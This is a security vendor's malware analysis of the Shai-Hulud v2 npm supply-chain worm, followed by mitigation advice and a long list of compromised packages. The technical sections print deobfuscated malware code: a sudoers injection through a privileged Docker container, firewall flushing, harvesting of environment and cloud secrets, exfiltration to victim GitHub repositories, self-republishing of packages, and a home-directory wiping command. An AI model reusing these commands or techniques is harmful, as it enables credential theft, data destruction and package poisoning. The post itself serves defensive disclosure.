---
title: "Shai Hulud Strikes Again (v2)"
date: 2025-11-24 12:00:00 +0000
categories: [Supply Chain, npm]
tags: [Shai-Hulud, Supply Chain, npm, Account Takeover, Credential Theft, GitHub Actions, Worm, CI/CD, TruffleHog, Zapier, Obfuscation, Infostealer]
author: socket_research_team
description: "Another wave of Shai-Hulud campaign has hit npm with more than 500 packages and 700+ versions affected."
toc: true
canonical_url: https://socket.dev/blog/shai-hulud-strikes-again-v2
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/ccef9de0616864d38380c35d26a0d9c76bdd0b5d-2796x1750.png?w=1600&q=95&fit=max&auto=format
  alt: Shai Hulud Strikes Again v2 artwork
---

> ***Update: November 26, 2025***
> PostHog has [published a detailed post mortem](https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem) describing how one of its GitHub Actions workflows was abused as an initial access vector for Shai Hulud v2. An attacker briefly opened a pull request that modified a script executed via `pull_request_target`, exfiltrated a bot personal access token from CI, then used that access to steal additional GitHub secrets including an npm publish token and ship malicious versions of several PostHog SDKs. PostHog has since revoked credentials, tightened workflow reviews, moved to trusted publishing, and reworked its secrets management. Their write up highlights how subtle CI workflow choices can create a path from untrusted contributions to package release credentials.

> ***Update: November 25, 2025***
> The Shai Hulud v2 campaign has primarily targeted the npm ecosystem, compromising hundreds of packages and exposing secrets from tens of thousands of GitHub repositories.
> We now also observe a spillover into the Java/Maven ecosystem: the Maven Central package [`org.mvnpm:posthog-node:4.18.1`](https://socket.dev/maven/package/org.mvnpm:posthog-node/overview/4.18.1) embeds the same Bun-based malicious payload (`bun_environment.js`, SHA-1: `d60ec97eea19fffb4809bc35b91033b52490ca11`) and `setup_bun.js` loader used in the npm campaign. This means the PostHog project has compromised releases in both the JavaScript/npm and Java/Maven ecosystems, driven by the same Shai Hulud v2 payload. We reported this compromised Maven package version to the Maven Central security team.
> At 18:06 UTC (10:06 PST), the Maven Central team confirmed they were investigating the artifact and explained that the `org.mvnpm` coordinates are produced via an automated mvnpm process that rebuilds npm packages as Maven artifacts, and that they are working on additional procedures to prevent already known compromised npm components from being rebundled.
> At 18:50 UTC (10:50 PST), the PostHog team confirmed that they do not publish to Maven directly and that the malicious npm version had already been removed from npm, with the Maven artifact representing a mirrored copy of that release.
> At 22:44 UTC (13:44 PST), the Maven Central team reported that they had purged the affected components from Maven Central and taken steps to prevent any reintroduction of these compromised artifacts.

Multiple npm packages from `@zapier` , `@asyncapi` , `@postman`, `@posthog` and `@ensdomains` have been compromised via account takeover/developer compromise. The malicious actor has made the following changes in these packages.

- Added a preinstall script [`setup_bun.js`](https://socket.dev/npm/package/@ensdomains/content-hash/files/3.0.1/setup_bun.js) in the package.json file
- The `setup_bun.js` file is a stealthy loader that silently installs or locates the Bun runtime and then executes a 10MB obfuscated and bundled malicious script ([`bun_environment.js`](https://socket.dev/npm/package/@ensdomains/content-hash/files/3.0.1/bun_environment.js)) with all output suppressed.

We will be updating the post with further technical analysis and list of additional packages.

## Technical Analysis

The attack uses a two-stage loader. When npm runs the preinstall script, it executes `setup_bun.js`, which:

1. Detects OS/architecture
2. Downloads or locates the Bun runtime for that platform
3. Caches Bun binary in `~/.cache` or equivalent
4. Spawns a detached Bun process running `bun_environment.js` with `POSTINSTALL_BG=1` flag
5. Suppresses all stdout/stderr and returns immediately

The package installation completes normally while the payload runs in the background.

## C2 Discovery via GitHub Search

Before executing its main payload, the malware attempts self-healing by searching public GitHub repositories for the beacon phrase:

`"Sha1-Hulud: The Second Coming."`

If found, it:

1. Reads a stored file containing a GitHub access token
2. Decodes it through three layers: base64 → base64 → base64
3. Uses the recovered token as its primary credential for exfiltration

This makes the malware self-healing—if a victim deletes previous malicious repositories, the attacker can re-seed victims through GitHub search. The beacon phrase also serves as a campaign signature for tracking infected repositories.

## Environment Fingerprinting

The payload collects system information:

```javascript
let _0x5735a8 = {
  'system': {
    'platform': _0x46410c["platform"],           // windows/linux/darwin
    'architecture': _0x46410c["architecture"],   // x86/x64/arm/arm64
    'hostname': a0_0xf22814["hostname"](),
    'os_user': a0_0xf22814["userInfo"](),
  },
  'modules': {
    'github': {
      'authenticated': _0x1b7dd4['isAuthenticated'](),
      'token': _0x1b7dd4['getCurrentToken'](),
      'username': _0x57709e,
    },
  },
};
```

It detects CI/CD environments by checking for:

- `GITHUB_ACTIONS` + `RUNNER_OS` (executes `Ry1()`, `cQ0()`, `pQ0()`, `gQ0()` functions)
- `BUILDKITE`
- `CODEBUILD_BUILD_NUMBER`
- `CIRCLE_SHA1`
- `PROJECT_ID`

## GitHub Actions Runner Privilege Escalation

On GitHub Actions runners (Linux only), the malware attempts to gain root access through sudoers manipulation.

### `pQ0()` - Sudoers Injection

First attempts passwordless sudo:

`sudo -n true`

If that fails, exploits Docker privileges to write `/etc/sudoers.d/runner`:

`docker run --rm --privileged -v /:/host ubuntu bash -c \\
"cp /host/tmp/runner /host/etc/sudoers.d/runner"`

This grants the malware passwordless root access on GitHub Actions runners.

### `gQ0()` - DNS and Firewall Manipulation

Once privileged, the malware:

1. Stops `systemd-resolved`
2. Replaces DNS configuration from `/tmp/resolved.conf`
3. Restarts the resolver
4. Flushes iptables rules:

```sh
sudo iptables -F OUTPUT
sudo iptables -F DOCKER-USER
```

This provides network-level control within CI environments, enabling:

- Man-in-the-middle attacks inside CI
- Redirection of package installs to malicious mirrors
- Blocking security scanners from reaching the internet
- Prevention of security updates

## Credential Collection

### 1. Environment Variables

```javascript
let _0x5bb75d = { 'environment': process["env"] };
```

Captures entire environment including `GITHUB_TOKEN`, `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and all CI-injected secrets.

### 2. TruffleHog Filesystem Scan

```javascript
async function uy1(_0x5a0845) {
  let _0x51fad2 = new Tl();
  await _0x51fad2["initialize"]();
  let _0x192d24 = await _0x51fad2["scanFilesystem"](a0_0xf22814["homedir"]());
  await _0x5a0845['saveContents']("truffleSecrets.json", JSON["stringify"](_0x192d24));
}
```

The `Tl` class:

- Downloads TruffleHog binary from `github.com/trufflesecurity/trufflehog/releases`
- Caches it in `~/.truffler-cache`
- Runs `trufflehog filesystem $HOME --json`
- Scans entire home directory for hardcoded secrets

### 3. Cloud Provider APIs

### AWS Multi-Region Enumeration

The AWS collector (`WX`) aggressively enumerates secrets across **all AWS regions**, not just the default:

```javascript
_0x3e4549 = {
  'aws': { 'secrets': await _0x30fddc["runSecrets"]() },
  'gcp': { 'secrets': await _0x79b1b9['listAndRetrieveAllSecrets']() },
  'azure': { 'secrets': await _0x8fa8f["listAndRetrieveAllSecrets"]() },
};
```

The AWS module loops through every available region, enumerating and dumping all secret values from AWS Secrets Manager in each. This regional sweeping is unusually aggressive and significantly increases the credential harvest in multi-region deployments.

GCP Secret Manager and Azure Key Vault are similarly enumerated to retrieve all accessible secrets.

### 4. GitHub Actions Secrets with Automated Credential Scraping

```javascript
async function ky1(_0x4c25d7) {
  if (_0x4c25d7["isAuthenticated"]() && await _0x4c25d7["checkWorkflowScope"]()) {
    let _0x5b24e2 = new mq(_0x3c6fb2);
    let _0x42eae5 = _0x5b24e2["userReposUpdatedSince"]();
    for await(let _0x4ed63b of _0x5b24e2['processReposStream'](_0x42eae5))
      _0x2b1cf7["push"](_0x4ed63b);
    return await _0x4c25d7["saveContents"]("actionsSecrets.json", JSON["stringify"](_0x2b1cf7));
  }
}
```

Enumerates user repositories and extracts GitHub Actions workflow secrets. The malware then mines this data for NPM tokens (see worm propagation section).

## Data Exfiltration

Creates a GitHub repository in the **victim's account** using the stolen GitHub token. The repository name is randomly generated:

```javascript
function tL0() {
  return Array["from"]({ 'length': 0x12 }, () =>
    Math["random"]()['toString'](0x24)['slice'](0x2, 0x3))['join']('');
}
```

Some repositories are created with the description: `"Sha1-Hulud: The Second Coming."` as a campaign marker.

### Triple-Base64 Encoding

All exfiltrated data is encoded through **three layers of base64** before upload:

`content → base64 → base64 → base64`
This serves multiple anti-forensic purposes:

- Evades GitHub's built-in secret scanning
- Bypasses third-party secret detection tools
- Makes casual browsing of repository contents ineffective
- Complicates forensic analysis of stolen data

Uploads five JSON files to the victim's repository:

```javascript
await _0x1b7dd4["createRepo"](tL0());
_0x1b7dd4["saveContents"]("contents.json", JSON["stringify"](_0x5735a8));      // System info + GitHub creds
_0x1b7dd4["saveContents"]("environment.json", JSON["stringify"](_0x5bb75d));   // All env vars
_0x1b7dd4["saveContents"]("cloud.json", JSON['stringify'](_0x3e4549));         // AWS/GCP/Azure secrets
_0x1b7dd4["saveContents"]("truffleSecrets.json", JSON["stringify"](_0x192d24));// TruffleHog findings
_0x1b7dd4["saveContents"]("actionsSecrets.json", JSON["stringify"](_0x2b1cf7));// GitHub Actions secrets
```

## Worm Propagation

### Primary NPM Token Exploitation

```javascript
async function El(_0x36c877) {
  let _0x23e1d9 = new Wl(_0x36c877);
  _0x4012c4 = await _0x23e1d9["validateToken"]();

  if (_0x4012c4) {
    let _0x8bd950 = await _0x23e1d9['getPackagesByMaintainer'](_0x4012c4, 0x64);  // Get up to 100 packages
    await Promise["all"](_0x8bd950["map"](async _0x1d876b => {
      await _0x23e1d9['updatePackage'](_0x1d876b);
    }));
  }
}
```

For each valid NPM token:

1. Validates token against npm registry
2. Fetches all packages by that maintainer (max 100)
3. Calls `updatePackage()` on each package

The `updatePackage()` function:

- Downloads the package tarball
- Injects two new files: `setup_bun.js` and `bun_environment.js`
- Patches `package.json` to add the preinstall script
- Increments the **patch version** (`x.y.z → x.y.z+1`)
- Publishes the new malicious version to npm

The patch-version bumping strategy makes infected packages harder to notice compared to major or minor version changes.

### Secondary Token Mining from GitHub Actions

Before giving up, the malware performs automated credential scraping on all GitHub Actions metadata, searching for any string that starts with `npm_`:

```javascript
for (let [_0x11c4f3, _0x402786] of Object['entries'](_0x5998e5)) {
  if (typeof _0x402786 === "string" && _0x402786['startsWith']("npm_")) {
    if ((await El(_0x402786))["npmTokenValid"]) {
      await Promise["all"]([_0x6e06c0, _0x584734, _0x3adc69, _0x53223d]);
      process['exit'](0x0);
    }
  }
}
```

This creates a full **CI → NPM takeover chain**: compromised GitHub Actions workflows reveal NPM tokens stored as secrets, which are then used to poison additional packages. This automated pivoting mechanism enables the worm to bootstrap propagation even without direct `NPM_TOKEN` environment variables.

## Destructive Payload

If no GitHub token is available and no NPM token is valid, executes file destruction:

```javascript
if (console['log']("Error 12"), _0x46410c["platform"] === "windows")
  Bun["spawnSync"](["cmd.exe", '/c',
    "del /F /Q /S \"%USERPROFILE%*\" && " +
    "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" & " +
    "cipher /W:%USERPROFILE%"]);
else
  Bun["spawnSync"](["bash", '-c',
    'find "$HOME" -type f -writable -user "$(id -un)" -print0 | ' +
    'xargs -0 -r shred -uvz -n 1 && ' +
    'find "$HOME" -depth -type d -empty -delete']);
```

**Windows:** Deletes all files in `%USERPROFILE%`, removes directories, overwrites free space with `cipher /W`

**Linux/macOS:** Finds all writable user files, shreds them with single-pass overwrite, deletes empty directories

## Stealth Mechanisms

Background execution:

```javascript
if (process["env"]["POSTINSTALL_BG"] !== '1') {
  Bun['spawn']([_0x4a3fc4, process["argv"][0x1]], {
    'env': { ...process["env"], 'POSTINSTALL_BG': '1' }
  })["unref"]();
  return;
}
```

Silent failure:

```javascript
jy1()["catch"](_0x5ddff6 => {
  process["exit"](0x0);  // Always exits with success code
});
```

All errors exit with code 0, suppressing npm warnings.

## Mitigations & Defenses

In the first Shai-Hulud Supply Chain compromise, the threat actor originally gained access through a [compromised maintainer account](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/), and likely did again. It is therefore incredibly pertinent to ensure the safety of your CI/CD pipeline.

**Immediate Actions:** If you have any of the packages listed above installed, remove them immediately and delete your **`node_modules`** folder. If these packages were installed in environments with access to secrets or credentials, rotate all API keys, tokens, and passwords immediately as the malicious code may have exfiltrated sensitive information. Follow [OpenJS](https://openjsf.org/blog/publishing-securely-on-npm)' guidance and understand the pros and cons to the different approaches to publishing to npm. Check GitHub for strange repos like those pictured below with the description, “Sha1-Hulud: The Second Coming.”

![](https://cdn.sanity.io/images/cgdhsj6q/production/26bb615512723b3b4029e11155773e53453e707c-1590x762.png?w=1600&q=95&fit=max&auto=format)

**Prevention:**

[Socket’s free GitHub app](https://socket.dev/features/github) can ensure that whenever a new dependency is added in a pull request, you will be informed about the package’s behavior and security risk. [Socket Firewall](https://socket.dev/blog/introducing-socket-firewall) will block malicious dependencies before they reach your machine. Also consider:

- Using package lock files and monitor your CI/CD pipeline continuously.
- Enforcing immutable build steps and require review before modifying CI configurations.
- Restricting who can trigger publishing workflows.
- Preventing CI jobs from accessing unnecessary secrets.
- Adding publication verification and require customers to verify provenance before trusting new versions.

## Indicators of Compromise

List of infected packages so far:-

1. [@accordproject/concerto-analysis](https://socket.dev/npm/package/@accordproject/concerto-analysis/overview/3.24.1) (v3.24.1)
2. [@accordproject/concerto-linter](https://socket.dev/npm/package/@accordproject/concerto-linter/overview/3.24.1) (v3.24.1)
3. [@accordproject/concerto-linter-default-ruleset](https://socket.dev/npm/package/@accordproject/concerto-linter-default-ruleset/overview/3.24.1) (v3.24.1)
4. [@accordproject/concerto-metamodel](https://socket.dev/npm/package/@accordproject/concerto-metamodel/overview/3.12.5) (v3.12.5)
5. [@accordproject/concerto-types](https://socket.dev/npm/package/@accordproject/concerto-types/overview/3.24.1) (v3.24.1)
6. [@accordproject/concerto-types](https://socket.dev/npm/package/@accordproject/concerto-types/overview/3.24.1) (v3.24.1)
7. [@accordproject/markdown-it-cicero](https://socket.dev/npm/package/@accordproject/markdown-it-cicero/overview/0.16.26) (v0.16.26)
8. [@accordproject/template-engine](https://socket.dev/npm/package/@accordproject/template-engine/overview/2.7.2) (v2.7.2)
9. [@actbase/css-to-react-native-transform](https://socket.dev/npm/package/@actbase/css-to-react-native-transform/overview/1.0.3) (v1.0.3)
10. [@actbase/css-to-react-native-transform](https://socket.dev/npm/package/@actbase/css-to-react-native-transform/files/1.0.3) (v1.0.3)
11. [@actbase/native](https://socket.dev/npm/package/@actbase/native/overview/0.1.32) (v0.1.32)
12. [@actbase/node-server](https://socket.dev/npm/package/@actbase/node-server/overview/1.1.19) (v1.1.19)
13. [@actbase/react-absolute](https://socket.dev/npm/package/@actbase/react-absolute/overview/0.8.3) (v0.8.3)
14. [@actbase/react-daum-postcode](https://socket.dev/npm/package/@actbase/react-daum-postcode/overview/1.0.5) (v1.0.5)
15. [@actbase/react-kakaosdk](https://socket.dev/npm/package/@actbase/react-kakaosdk/overview/0.9.27) (v0.9.27)
16. [@actbase/react-native-actionsheet](https://socket.dev/npm/package/@actbase/react-native-actionsheet/overview/1.0.3) (v1.0.3)
17. [@actbase/react-native-devtools](https://socket.dev/npm/package/@actbase/react-native-devtools/overview/0.1.3) (v0.1.3)
18. [@actbase/react-native-fast-image](https://socket.dev/npm/package/@actbase/react-native-fast-image/overview/8.5.13) (v8.5.13)
19. [@actbase/react-native-kakao-channel](https://socket.dev/npm/package/@actbase/react-native-kakao-channel/overview/1.0.2) (v1.0.2)
20. [@actbase/react-native-kakao-navi](https://socket.dev/npm/package/@actbase/react-native-kakao-navi/overview/2.0.4) (v2.0.4)
21. [@actbase/react-native-less-transformer](https://socket.dev/npm/package/@actbase/react-native-less-transformer/overview/1.0.6) (v1.0.6)
22. [@actbase/react-native-naver-login](https://socket.dev/npm/package/@actbase/react-native-naver-login/overview/1.0.1) (v1.0.1)
23. [@actbase/react-native-simple-video](https://socket.dev/npm/package/@actbase/react-native-simple-video/overview/1.0.13) (v1.0.13)
24. [@actbase/react-native-tiktok](https://socket.dev/npm/package/@actbase/react-native-tiktok/overview/1.1.3) (v1.1.3)
25. [@afetcan/api](https://socket.dev/npm/package/@afetcan/api/files/0.0.13) (v0.0.13)
26. [@afetcan/storage](https://socket.dev/npm/package/@afetcan/storage/files/0.0.27) (v0.0.27)
27. [@alaan/s2s-auth](https://socket.dev/npm/package/@alaan/s2s-auth/overview/2.0.3) (v2.0.3)
28. [@alexadark/amadeus-api](https://socket.dev/npm/package/@alexadark/amadeus-api/overview/1.0.4) (v1.0.4)
29. [@alexadark/gatsby-theme-events](https://socket.dev/npm/package/@alexadark/gatsby-theme-events/overview/1.0.1) (v1.0.1)
30. [@alexadark/gatsby-theme-wordpress-blog](https://socket.dev/npm/package/@alexadark/gatsby-theme-wordpress-blog/overview/2.0.1) (v2.0.1)
31. [@alexadark/reusable-functions](https://socket.dev/npm/package/@alexadark/reusable-functions/overview/1.5.1) (v1.5.1)
32. [@alexcolls/nuxt-socket.io](https://socket.dev/npm/package/@alexcolls/nuxt-socket.io/overview/0.0.8) (v0.0.7, v0.0.8)
33. [@alexcolls/nuxt-ux](https://socket.dev/npm/package/@alexcolls/nuxt-ux/overview/0.6.2) (v0.6.1, v0.6.2)
34. [@antstackio/eslint-config-antstack](https://socket.dev/npm/package/@antstackio/eslint-config-antstack/overview/0.0.3) (v0.0.3)
35. [@antstackio/express-graphql-proxy](https://socket.dev/npm/package/@antstackio/express-graphql-proxy/overview/0.2.8) (v0.2.8)
36. [@antstackio/graphql-body-parser](https://socket.dev/npm/package/@antstackio/graphql-body-parser/overview/0.1.1) (v0.1.1)
37. [@antstackio/json-to-graphql](https://socket.dev/npm/package/@antstackio/json-to-graphql/overview/1.0.3) (v1.0.3)
38. [@antstackio/shelbysam](https://socket.dev/npm/package/@antstackio/shelbysam/overview/1.1.7) (v1.1.7)
39. [@aryanhussain/my-angular-lib](https://socket.dev/npm/package/@aryanhussain/my-angular-lib/overview/0.0.23) (v0.0.23)
40. [@asyncapi/avro-schema-parser](https://socket.dev/npm/package/@asyncapi/avro-schema-parser) (v3.0.25)
41. [@asyncapi/avro-schema-parser](https://socket.dev/npm/package/@asyncapi/avro-schema-parser/overview/3.0.26) (v3.0.26)
42. [@asyncapi/bundler](https://socket.dev/npm/package/@asyncapi/bundler/files/0.6.5) (v0.6.5, v0.6.6)
43. [@asyncapi/bundler](https://socket.dev/npm/package/@asyncapi/bundler/overview/0.6.6) (v0.6.6)
44. [@asyncapi/cli](https://socket.dev/npm/package/@asyncapi/cli) (v4.1.2)
45. [@asyncapi/cli](https://socket.dev/npm/package/@asyncapi/cli/overview/4.1.3) (v4.1.3)
46. [@asyncapi/converter](https://socket.dev/npm/package/@asyncapi/converter) (v1.6.3)
47. [@asyncapi/converter](https://socket.dev/npm/package/@asyncapi/converter/overview/1.6.4) (v1.6.4)
48. [@asyncapi/diff](https://socket.dev/npm/package/@asyncapi/diff) (v0.5.1)
49. [@asyncapi/diff](https://socket.dev/npm/package/@asyncapi/diff/overview/0.5.2) (v0.5.2)
50. [@asyncapi/dotnet-rabbitmq-template](https://socket.dev/npm/package/@asyncapi/dotnet-rabbitmq-template) (v1.0.1)
51. [@asyncapi/dotnet-rabbitmq-template](https://socket.dev/npm/package/@asyncapi/dotnet-rabbitmq-template/overview/1.0.2) (v1.0.2)
52. [@asyncapi/edavisualiser](https://socket.dev/npm/package/@asyncapi/edavisualiser) (v1.2.1)
53. [@asyncapi/edavisualiser](https://socket.dev/npm/package/@asyncapi/edavisualiser/overview/1.2.2) (v1.2.2)
54. [@asyncapi/generator](https://socket.dev/npm/package/@asyncapi/generator) (v2.8.5)
55. [@asyncapi/generator](https://socket.dev/npm/package/@asyncapi/generator/overview/2.8.6) (v2.8.6)
56. [@asyncapi/generator-components](https://socket.dev/npm/package/@asyncapi/generator-components) (v0.3.2)
57. [@asyncapi/generator-components](https://socket.dev/npm/package/@asyncapi/generator-components/overview/0.3.3) (v0.3.3)
58. [@asyncapi/generator-helpers](https://socket.dev/npm/package/@asyncapi/generator-helpers) (v0.2.1)
59. [@asyncapi/generator-helpers](https://socket.dev/npm/package/@asyncapi/generator-helpers/overview/0.2.2) (v0.2.2)
60. [@asyncapi/generator-react-sdk](https://socket.dev/npm/package/@asyncapi/generator-react-sdk) (v1.1.4)
61. [@asyncapi/generator-react-sdk](https://socket.dev/npm/package/@asyncapi/generator-react-sdk/overview/1.1.5) (v1.1.5)
62. [@asyncapi/go-watermill-template](https://socket.dev/npm/package/@asyncapi/go-watermill-template) (v0.2.76)
63. [@asyncapi/go-watermill-template](https://socket.dev/npm/package/@asyncapi/go-watermill-template/overview/0.2.77) (v0.2.77)
64. [@asyncapi/html-template](https://socket.dev/npm/package/@asyncapi/html-template) (v3.3.2)
65. [@asyncapi/html-template](https://socket.dev/npm/package/@asyncapi/html-template/overview/3.3.3) (v3.3.3)
66. [@asyncapi/java-spring-cloud-stream-template](https://socket.dev/npm/package/@asyncapi/java-spring-cloud-stream-template) (v0.13.5)
67. [@asyncapi/java-spring-cloud-stream-template](https://socket.dev/npm/package/@asyncapi/java-spring-cloud-stream-template/overview/0.13.6) (v0.13.6)
68. [@asyncapi/java-spring-template](https://socket.dev/npm/package/@asyncapi/java-spring-template) (v1.6.1)
69. [@asyncapi/java-spring-template](https://socket.dev/npm/package/@asyncapi/java-spring-template/overview/1.6.2) (v1.6.2)
70. [@asyncapi/java-template](https://socket.dev/npm/package/@asyncapi/java-template) (v0.3.5)
71. [@asyncapi/java-template](https://socket.dev/npm/package/@asyncapi/java-template/overview/0.3.6) (v0.3.6)
72. [@asyncapi/keeper](https://socket.dev/npm/package/@asyncapi/keeper) (v0.0.2)
73. [@asyncapi/keeper](https://socket.dev/npm/package/@asyncapi/keeper/overview/0.0.3) (v0.0.3)
74. [@asyncapi/markdown-template](https://socket.dev/npm/package/@asyncapi/markdown-template/overview/1.6.9) (v1.6.8, v1.6.9)
75. [@asyncapi/modelina](https://socket.dev/npm/package/@asyncapi/modelina) (v5.10.2)
76. [@asyncapi/modelina](https://socket.dev/npm/package/@asyncapi/modelina/overview/5.10.3) (v5.10.3)
77. [@asyncapi/modelina-cli](https://socket.dev/npm/package/@asyncapi/modelina-cli) (v5.10.2)
78. [@asyncapi/modelina-cli](https://socket.dev/npm/package/@asyncapi/modelina-cli/overview/5.10.3) (v5.10.3)
79. [@asyncapi/multi-parser](https://socket.dev/npm/package/@asyncapi/multi-parser) (v2.2.1)
80. [@asyncapi/multi-parser](https://socket.dev/npm/package/@asyncapi/multi-parser/overview/2.2.2) (v2.2.2)
81. [@asyncapi/nodejs-template](https://socket.dev/npm/package/@asyncapi/nodejs-template) (v3.0.5)
82. [@asyncapi/nodejs-template](https://socket.dev/npm/package/@asyncapi/nodejs-template/overview/3.0.6) (v3.0.6)
83. [@asyncapi/nodejs-ws-template](https://socket.dev/npm/package/@asyncapi/nodejs-ws-template) (v0.10.1)
84. [@asyncapi/nodejs-ws-template](https://socket.dev/npm/package/@asyncapi/nodejs-ws-template/overview/0.10.2) (v0.10.2)
85. [@asyncapi/nunjucks-filters](https://socket.dev/npm/package/@asyncapi/nunjucks-filters) (v2.1.1)
86. [@asyncapi/nunjucks-filters](https://socket.dev/npm/package/@asyncapi/nunjucks-filters/overview/2.1.2) (v2.1.2)
87. [@asyncapi/openapi-schema-parser](https://socket.dev/npm/package/@asyncapi/openapi-schema-parser) (v3.0.25)
88. [@asyncapi/openapi-schema-parser](https://socket.dev/npm/package/@asyncapi/openapi-schema-parser/overview/3.0.26) (v3.0.26)
89. [@asyncapi/optimizer](https://socket.dev/npm/package/@asyncapi/optimizer) (v1.0.5)
90. [@asyncapi/optimizer](https://socket.dev/npm/package/@asyncapi/optimizer/overview/1.0.6) (v1.0.6)
91. [@asyncapi/parser](https://socket.dev/npm/package/@asyncapi/parser) (v3.4.1)
92. [@asyncapi/parser](https://socket.dev/npm/package/@asyncapi/parser/overview/3.4.2) (v3.4.2)
93. [@asyncapi/php-template](https://socket.dev/npm/package/@asyncapi/php-template) (v0.1.1)
94. [@asyncapi/php-template](https://socket.dev/npm/package/@asyncapi/php-template/overview/0.1.2) (v0.1.2)
95. [@asyncapi/problem](https://socket.dev/npm/package/@asyncapi/problem) (v1.0.1)
96. [@asyncapi/problem](https://socket.dev/npm/package/@asyncapi/problem/overview/1.0.2) (v1.0.2)
97. [@asyncapi/protobuf-schema-parser](https://socket.dev/npm/package/@asyncapi/protobuf-schema-parser) (v3.5.2, v3.6.1)
98. [@asyncapi/protobuf-schema-parser](https://socket.dev/npm/package/@asyncapi/protobuf-schema-parser/overview/3.5.3) (v3.5.3)
99. [@asyncapi/python-paho-template](https://socket.dev/npm/package/@asyncapi/python-paho-template) (v0.2.14)
100. [@asyncapi/python-paho-template](https://socket.dev/npm/package/@asyncapi/python-paho-template/overview/0.2.15) (v0.2.15)
101. [@asyncapi/react-component](https://socket.dev/npm/package/@asyncapi/react-component) (v2.6.6)
102. [@asyncapi/react-component](https://socket.dev/npm/package/@asyncapi/react-component/overview/2.6.7) (v2.6.7)
103. [@asyncapi/server-api](https://socket.dev/npm/package/@asyncapi/server-api) (v0.16.24)
104. [@asyncapi/server-api](https://socket.dev/npm/package/@asyncapi/server-api/overview/0.16.25) (v0.16.25)
105. [@asyncapi/specs](https://socket.dev/npm/package/@asyncapi/specs) (v6.8.2, v6.9.1, v6.10.1)
106. [@asyncapi/specs](https://socket.dev/npm/package/@asyncapi/specs/overview/6.8.3) (v6.8.3)
107. [@asyncapi/studio](https://socket.dev/npm/package/@asyncapi/studio) (v1.0.2)
108. [@asyncapi/studio](https://socket.dev/npm/package/@asyncapi/studio/overview/1.0.3) (v1.0.3)
109. [@asyncapi/web-component](https://socket.dev/npm/package/@asyncapi/web-component) (v2.6.6)
110. [@asyncapi/web-component](https://socket.dev/npm/package/@asyncapi/web-component/overview/2.6.7) (v2.6.7)
111. [@bdkinc/knex-ibmi](https://socket.dev/npm/package/@bdkinc/knex-ibmi) (v0.5.7)
112. [@browserbasehq/bb9](https://socket.dev/npm/package/@browserbasehq/bb9) (v1.2.21)
113. [@browserbasehq/director-ai](https://socket.dev/npm/package/@browserbasehq/director-ai) (v1.0.3)
114. [@browserbasehq/mcp](https://socket.dev/npm/package/@browserbasehq/mcp) (v2.1.1)
115. [@browserbasehq/mcp-server-browserbase](https://socket.dev/npm/package/@browserbasehq/mcp-server-browserbase) (v2.4.2)
116. [@browserbasehq/sdk-functions](https://socket.dev/npm/package/@browserbasehq/sdk-functions) (v0.0.4)
117. [@browserbasehq/stagehand](https://socket.dev/npm/package/@browserbasehq/stagehand) (v3.0.4)
118. [@browserbasehq/stagehand-docs](https://socket.dev/npm/package/@browserbasehq/stagehand-docs) (v1.0.1)
119. [@caretive/caret-cli](https://socket.dev/npm/package/@caretive/caret-cli/overview/0.0.2) (v0.0.2)
120. [@chtijs/eslint-config](https://socket.dev/npm/package/@chtijs/eslint-config) (v1.0.1)
121. [@clausehq/flows-step-httprequest](https://socket.dev/npm/package/@clausehq/flows-step-httprequest/overview/0.1.14) (v0.1.14)
122. [@clausehq/flows-step-jsontoxml](https://socket.dev/npm/package/@clausehq/flows-step-jsontoxml/overview/0.1.14) (v0.1.14)
123. [@clausehq/flows-step-mqtt](https://socket.dev/npm/package/@clausehq/flows-step-mqtt/overview/0.1.14) (v0.1.14)
124. [@clausehq/flows-step-sendgridemail](https://socket.dev/npm/package/@clausehq/flows-step-sendgridemail/overview/0.1.14) (v0.1.14)
125. [@clausehq/flows-step-taskscreateurl](https://socket.dev/npm/package/@clausehq/flows-step-taskscreateurl/overview/0.1.14) (v0.1.14)
126. [@cllbk/ghl](https://socket.dev/npm/package/@cllbk/ghl) (v1.3.1)
127. [@commute/bloom](https://socket.dev/npm/package/@commute/bloom/overview/1.0.3) (v1.0.3)
128. [@commute/market-data](https://socket.dev/npm/package/@commute/market-data/overview/1.0.2) (v1.0.2)
129. [@commute/market-data-chartjs](https://socket.dev/npm/package/@commute/market-data-chartjs/overview/2.3.1) (v2.3.1)
130. [@dev-blinq/ai-qa-logic](https://socket.dev/npm/package/@dev-blinq/ai-qa-logic/overview/1.0.19) (v1.0.19)
131. [@dev-blinq/blinqioclient ](https://socket.dev/npm/package/@dev-blinq/blinqioclient/files/1.0.21)(v1.0.21)
132. [@dev-blinq/cucumber_client](https://socket.dev/npm/package/@dev-blinq/cucumber_client/overview/1.0.738) (v1.0.738)
133. [@dev-blinq/cucumber-js](https://socket.dev/npm/package/@dev-blinq/cucumber-js/overview/1.0.131) (v1.0.131)
134. [@dev-blinq/ui-systems](https://socket.dev/npm/package/@dev-blinq/ui-systems/overview/1.0.93) (v1.0.93)
135. [@ensdomains/address-encoder](https://socket.dev/npm/package/@ensdomains/address-encoder/overview/1.1.5) (v1.1.5)
136. [@ensdomains/blacklist](https://socket.dev/npm/package/@ensdomains/blacklist/overview/1.0.1) (v1.0.1)
137. [@ensdomains/buffer](https://socket.dev/npm/package/@ensdomains/buffer/overview/0.1.2) (v0.1.2)
138. [@ensdomains/ccip-read-cf-worker](https://socket.dev/npm/package/@ensdomains/ccip-read-cf-worker/overview/0.0.4) (v0.0.4)
139. [@ensdomains/ccip-read-dns-gateway](https://socket.dev/npm/package/@ensdomains/ccip-read-dns-gateway/overview/0.1.1) (v0.1.1)
140. [@ensdomains/ccip-read-router](https://socket.dev/npm/package/@ensdomains/ccip-read-router/overview/0.0.7) (v0.0.7)
141. [@ensdomains/ccip-read-worker-viem](https://socket.dev/npm/package/@ensdomains/ccip-read-worker-viem/overview/0.0.4) (v0.0.4)
142. [@ensdomains/content-hash](https://socket.dev/npm/package/@ensdomains/content-hash/overview/3.0.1) (v3.0.1)
143. [@ensdomains/curvearithmetics](https://socket.dev/npm/package/@ensdomains/curvearithmetics/overview/1.0.1) (v1.0.1)
144. [@ensdomains/cypress-metamask](https://socket.dev/npm/package/@ensdomains/cypress-metamask/overview/1.2.1) (v1.2.1)
